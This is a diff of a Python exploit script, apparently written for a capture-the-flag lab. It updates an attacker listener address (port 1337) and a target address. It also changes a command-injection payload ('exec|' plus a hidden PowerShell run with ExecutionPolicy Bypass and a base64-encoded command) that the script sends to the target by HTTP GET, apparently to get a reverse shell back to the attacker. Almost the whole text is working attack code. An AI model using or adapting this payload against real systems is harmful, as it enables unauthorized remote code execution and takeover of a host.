@@ -16,9 +16,9 @@ import os
 import urllib.request
 import urllib.parse
 
-lhost = "10.10.16.24"
+lhost = "10.10.16.25"
 lport = 1337
-rhost = "10.129.52.124"
+rhost = "10.129.57.71"
 rport = 80
 
 # Define the command to be written to a file
@@ -29,7 +29,7 @@ encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
 print("\nEncoded the command in base64 format...")
 
 # Define the payload to be included in the URL
-payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'
+payload = f'exec|C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'
 
 # Encode the payload and send a HTTP GET request
 encoded_payload = urllib.parse.quote_plus(payload)
